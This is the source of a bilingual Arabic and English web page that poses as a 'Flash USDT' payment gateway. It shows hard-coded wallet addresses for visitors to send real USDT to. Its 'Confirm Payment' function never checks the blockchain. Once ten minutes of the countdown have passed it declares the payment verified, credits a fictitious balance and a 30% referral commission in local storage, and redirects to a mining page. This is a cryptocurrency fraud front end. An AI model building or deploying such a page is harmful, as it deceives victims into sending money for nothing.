<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://cryptologos.cc/logos/tether-usdt-logo.png">
    <title>تأكيد الدفع الآمن - Flash USDT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            background: #0b0e11;
            color: #eaecef;
            font-family: 'Segoe UI', sans-serif;
        }

        .payment-card {
            background: #1e2329;
            border: 1px solid #333;
            border-radius: 24px;
        }

        .copy-btn {
            background: #26A17B;
            transition: 0.2s;
        }

        .copy-btn:active {
            transform: scale(0.9);
        }

        /* تنسيق قائمة اللغة العائمة */

        .lang-container {
            position: absolute;
            top: 20px;
            left: 20px;
            z-index: 100;
        }

        [dir="ltr"] .lang-container {
            left: auto;
            right: 20px;
        }

        .lang-dropdown-menu {
            left: 0;
        }

        [dir="ltr"] .lang-dropdown-menu {
            left: auto;
            right: 0;
        }

        * {
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            margin: 0;
            background: #0b0e11;
        }

        .payment-shell {
            display: grid;
            grid-template-rows: 72px 1fr;
            min-height: 100vh;
            background: #0b0e11;
        }

        .payment-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            min-height: 72px;
            padding: 0 32px;
            background: #151b20;
            border-bottom: 1px solid #2b3139;
        }

        .payment-brand {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #f1f5f9;
            font-size: 16px;
            font-weight: 800;
        }

        .payment-brand-mark {
            width: 36px;
            height: 36px;
            object-fit: contain;
        }

        .lang-container {
            position: static;
            z-index: auto;
        }

        .payment-main {
            display: grid;
            grid-template-columns: minmax(0, 1fr) minmax(380px, 0.9fr);
            min-height: calc(100vh - 72px);
        }

        .payment-summary {
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 48px clamp(32px, 7vw, 104px);
            background: #151b20;
            border-inline-end: 1px solid #2b3139;
        }

        .summary-heading {
            max-width: 620px;
            margin-bottom: 44px;
            text-align: start;
        }

        .summary-heading h1,
        .summary-heading h2 {
            margin: 0 0 12px;
            color: #f8fafc;
            font-size: 32px;
            font-weight: 800;
            line-height: 1.25;
        }

        .summary-heading p {
            max-width: 540px;
            margin: 0;
            color: #94a3b8;
            font-size: 15px;
            line-height: 1.7;
        }

        .payment-meta {
            display: grid;
            grid-template-columns: repeat(2, minmax(0, 1fr));
            gap: 24px;
            max-width: 620px;
            padding: 24px 0;
            border-top: 1px solid #2b3139;
            border-bottom: 1px solid #2b3139;
        }

        .payment-meta > div:last-child {
            padding-inline-start: 24px;
            border-inline-start: 1px solid #2b3139;
            text-align: start;
        }

        .payment-meta #displayPrice {
            color: #26A17B;
        }

        .payment-panel {
            display: flex;
            flex-direction: column;
            justify-content: center;
            width: 100%;
            padding: 48px;
            background: #0b0e11;
        }

        .payment-panel > * {
            width: 100%;
            max-width: 470px;
            margin-inline: auto;
        }

        .qr-section {
            margin-bottom: 28px;
            text-align: center;
        }

        .qr-frame {
            display: flex;
            justify-content: center;
            width: 220px;
            max-width: 100%;
            margin: 0 auto;
            padding: 0;
            background: transparent;
            border-radius: 0;
        }

        #qrCode {
            display: block;
            width: min(220px, 100%);
            height: auto;
        }

        .wallet-section {
            margin-top: 24px;
            text-align: start;
        }

        .wallet-row {
            display: flex;
            gap: 8px;
            width: 100%;
            margin-top: 8px;
        }

        .copy-btn {
            flex: 0 0 52px;
            width: 52px;
            height: 52px;
            padding: 0;
            border-radius: 8px;
        }

        #walletAddr {
            min-width: 0;
            height: 52px;
            padding: 12px;
        }

        .payment-warning {
            padding: 16px;
            margin-bottom: 28px;
            background: rgba(133, 77, 14, 0.12);
            border: 1px solid rgba(202, 138, 4, 0.32);
            border-radius: 8px;
        }

        .timer-section {
            padding-top: 24px;
            margin-bottom: 24px;
            text-align: center;
            border-top: 1px solid #2b3139;
        }

        .confirm-button,
        button[onclick="checkPayment()"] {
            min-height: 56px;
            border-radius: 8px;
            background: #26A17B;
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            transition: background 0.2s ease;
        }

        .confirm-button:hover,
        button[onclick="checkPayment()"]:hover {
            background: #1e8565;
        }

        @media (max-width: 880px) {
            .payment-main {
                grid-template-columns: 1fr;
                min-height: 0;
            }

            .payment-summary {
                padding: 40px 32px;
                border-inline-end: 0;
                border-bottom: 1px solid #2b3139;
            }

            .summary-heading {
                margin-bottom: 32px;
            }

            .payment-panel {
                padding: 40px 32px;
            }
        }

        @media (max-width: 520px) {
            .payment-header {
                padding: 0 16px;
            }

            .payment-summary,
            .payment-panel {
                padding: 32px 16px;
            }

            .summary-heading h1,
            .summary-heading h2 {
                font-size: 26px;
            }

            .payment-meta {
                grid-template-columns: 1fr;
                gap: 20px;
            }

            .payment-meta > div:last-child {
                padding-top: 20px;
                padding-inline-start: 0;
                border-top: 1px solid #2b3139;
                border-inline-start: 0;
            }

            #qrCode {
                width: 180px;
            }
        }
    </style>
</head>

<body>
    <div class="payment-shell">
        <header class="payment-header">
            <div class="payment-brand">
                <img class="payment-brand-mark" src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT">
                <span>FLASH PRO</span>
            </div>

    <div class="lang-container">
        <div class="relative inline-block text-left">
            <button onclick="toggleLangMenu()" class="flex items-center justify-center w-10 h-10 rounded-full bg-[#1e2329] border border-gray-700 text-gray-400 hover:text-white hover:border-[#26A17B] transition shadow-lg focus:outline-none">
                <i class="fas fa-globe text-lg"></i>
            </button>

            <div id="langDropdown" class="hidden absolute mt-2 w-32 rounded-xl shadow-lg bg-[#1e2329] border border-gray-700 ring-1 ring-black ring-opacity-5 focus:outline-none lang-dropdown-menu">
                <div class="py-2">
                    <button onclick="setLanguage('ar')" class="text-gray-300 hover:bg-[#2b3139] hover:text-[#26A17B] flex items-center justify-between w-full px-4 py-2 text-sm transition">
                        العربية <span>🇸🇦</span>
                    </button>
                    <button onclick="setLanguage('en')" class="text-gray-300 hover:bg-[#2b3139] hover:text-[#26A17B] flex items-center justify-between w-full px-4 py-2 text-sm transition">
                        English <span>🇺🇸</span>
                    </button>
                </div>
            </div>
        </div>
    </div>

        </header>

        <main class="payment-main">
            <section class="payment-summary">
                <div class="summary-heading">
            <h2 class="text-2xl font-bold mb-2" data-i18n="payTitle">بوابة الدفع الآمنة</h2>
            <p class="text-gray-500 text-sm" data-i18n="payDesc">يرجى تحويل المبلغ المطلوب لإتمام عملية إرسال الفلاش</p>
        </div>

                <div class="payment-meta">
            <div>
                <span class="text-gray-500 text-xs block" data-i18n="amtReq">المبلغ المطلوب</span>
                <span id="displayPrice" class="text-2xl font-bold text-[#26A17B]">0.00</span> <span class="text-sm">USDT</span>
            </div>
            <div class="text-right" dir="auto">
                <span class="text-gray-500 text-xs block" data-i18n="netSel">الشبكة المختارة</span>
                <span id="displayNet" class="font-bold text-white">TRC20</span>
            </div>
        </div>

            </section>
            <section class="payment-panel">
                <div class="qr-section">
                    <div class="qr-frame">
                <img id="qrCode" src="TRC20.png" alt="TRC20 QR Code" width="180">
            </div>

                    <div class="wallet-section" dir="auto">
                <label class="text-xs text-gray-500 mx-2 block" data-i18n="walletLabel">عنوان المحفظة (اضغط للنسخ)</label>
                        <div class="wallet-row" dir="ltr">
                    <button onclick="copyAddr()" class="copy-btn px-4 rounded-lg text-white"><i class="fas fa-copy"></i></button>
                    <input type="text" id="walletAddr" readonly class="w-full bg-black border border-gray-700 p-3 rounded-lg text-xs font-mono text-center outline-none text-white">
                </div>
            </div>
        </div>

                <div class="payment-warning">
            <p class="text-[10px] text-yellow-500 leading-relaxed text-center">
                <i class="fas fa-exclamation-triangle mx-1"></i>
                <span data-i18n="alert1">تنبيه: أرسل فقط USDT عبر شبكة</span>
                <span id="alertNet" class="font-bold text-white mx-1">..</span>
                <span data-i18n="alert2">إرسال عملات أخرى قد يؤدي لضياع أموالك. سيتم إرسال الفلاش فور حصول المعاملة على تأكيد واحد.</span>
            </p>
        </div>

                <div class="timer-section">
            <p class="text-xs text-gray-500 mb-1" data-i18n="expTime">تنتهي صلاحية الطلب خلال:</p>
            <div id="payTimer" class="text-xl font-mono font-bold text-red-500">30:00</div>
        </div>

        <button onclick="checkPayment()" class="w-full py-4 bg-[#26A17B] rounded-xl font-bold text-lg text-white shadow-lg hover:bg-[#1e8565] transition" data-i18n="btnCheck">تأكيد الدفع (Check Payment)</button>
            </section>
        </main>
    </div>

    <script>
        // --------- نظام الترجمة الاحترافي ---------
        const translations = {
            ar: {
                pageTitle: "تأكيد الدفع الآمن - Flash USDT",
                payTitle: "بوابة الدفع الآمنة",
                payDesc: "يرجى تحويل المبلغ المطلوب لإتمام عملية إرسال الفلاش",
                amtReq: "المبلغ المطلوب",
                netSel: "الشبكة المختارة",
                walletLabel: "عنوان المحفظة (اضغط للنسخ)",
                alert1: "تنبيه: أرسل فقط USDT عبر شبكة",
                alert2: "إرسال عملات أخرى قد يؤدي لضياع أموالك. سيتم إرسال الفلاش فور حصول المعاملة على تأكيد واحد.",
                expTime: "تنتهي صلاحية الطلب خلال:",
                btnCheck: "تأكيد الدفع (Check Payment)",
                copySuccess: "تم نسخ العنوان بنجاح!",
                checkWait: "جاري التحقق من المعاملة على شبكة البلوكشين... يرجى الانتظار لحين حصول المعاملة على التأكيدات اللازمة والمحاولة بعد قليل.",
                checkSuccess: "تم التأكد من الدفع بنجاح! تمت إضافة الفلاش إلى حسابك."
            },
            en: {
                pageTitle: "Secure Payment - Flash USDT",
                payTitle: "Secure Payment Gateway",
                payDesc: "Please transfer the required amount to complete the Flash USDT delivery",
                amtReq: "Amount Required",
                netSel: "Selected Network",
                walletLabel: "Wallet Address (Click to copy)",
                alert1: "Warning: Only send USDT via",
                alert2: "network. Sending other coins may result in permanent loss. Flash will be credited after 1 network confirmation.",
                expTime: "Order expires in:",
                btnCheck: "Confirm Payment",
                copySuccess: "Address copied successfully!",
                checkWait: "Checking transaction on the blockchain... Please wait for network confirmations and try again in a few moments.",
                checkSuccess: "Payment verified successfully! Flash has been added to your account."
            }
        };

        let currentLang = 'ar';

        function toggleLangMenu() {
            document.getElementById('langDropdown').classList.toggle('hidden');
        }

        window.onclick = function(event) {
            if (!event.target.closest('.lang-container')) {
                const dropdown = document.getElementById('langDropdown');
                if (dropdown && !dropdown.classList.contains('hidden')) {
                    dropdown.classList.add('hidden');
                }
            }
        }

        function setLanguage(lang) {
            currentLang = lang;
            localStorage.setItem('site_lang', lang);

            const html = document.documentElement;
            if (lang === 'en') {
                html.setAttribute('lang', 'en');
                html.setAttribute('dir', 'ltr');
                document.body.style.textAlign = 'left';
            } else {
                html.setAttribute('lang', 'ar');
                html.setAttribute('dir', 'rtl');
                document.body.style.textAlign = 'right';
            }

            document.title = translations[lang].pageTitle;

            // تحديث جميع النصوص
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n');
                if (translations[lang][key]) el.innerText = translations[lang][key];
            });

            document.getElementById('langDropdown').classList.add('hidden');
        }

        window.onload = () => {
            const savedLang = localStorage.getItem('site_lang') || 'ar';
            setLanguage(savedLang);
        };

        // --------- منطق الصفحة ---------
        const urlParams = new URLSearchParams(window.location.search);
        const price = urlParams.get('price') || '0.00';
        const net = 'TRC20';
        const amt = urlParams.get('amt') || '0';

        // تم تحديث العناوين هنا
        const wallets = {
            'TRC20': 'TEznkT5SKzYNHNe3wDEwfrxLpAq9HYA9sP',
            'BEP20': '0x41f8a3a3a841cb3305bf1ebabe4ede7169a55bce'
        }

        const currentWallet = wallets['TRC20'];

        document.getElementById('displayPrice').innerText = price;
        document.getElementById('displayNet').innerText = net;
        document.getElementById('alertNet').innerText = net;
        document.getElementById('walletAddr').value = currentWallet;

        document.getElementById('qrCode').src = 'TRC20.png';

        let paySecs = 1800;
        setInterval(() => {
            paySecs--;
            let m = Math.floor(paySecs / 60),
                s = paySecs % 60;
            document.getElementById('payTimer').innerText = `${m}:${s < 10 ? '0'+s : s}`;
            if (paySecs <= 0) location.reload();
        }, 1000);

        function copyAddr() {
            const el = document.getElementById('walletAddr');
            el.select();
            document.execCommand('copy');
            alert(translations[currentLang].copySuccess);
        }

        function checkPayment() {
            if (paySecs > 600) {
                alert(translations[currentLang].checkWait);
                return;
            }

            alert(translations[currentLang].checkSuccess);

            const activeUser = localStorage.getItem('current_session');
            const flashAmount = parseFloat(amt);

            if (flashAmount > 0) {
                let myBal = parseFloat(localStorage.getItem('flash_mining_bal')) || 0;
                myBal += flashAmount;
                localStorage.setItem('flash_mining_bal', myBal.toString());
            }

            const referrer = localStorage.getItem('referred_by_' + activeUser);
            if (referrer && flashAmount > 0) {
                let refStats = JSON.parse(localStorage.getItem('ref_stats_' + referrer)) || {
                    count: 0,
                    earnings: 0
                };
                let commission = flashAmount * 0.30;
                refStats.earnings += commission;
                localStorage.setItem('ref_stats_' + referrer, JSON.stringify(refStats));
            }

            window.location.href = 'mining.html';
        }
    </script>
</body>

</html>
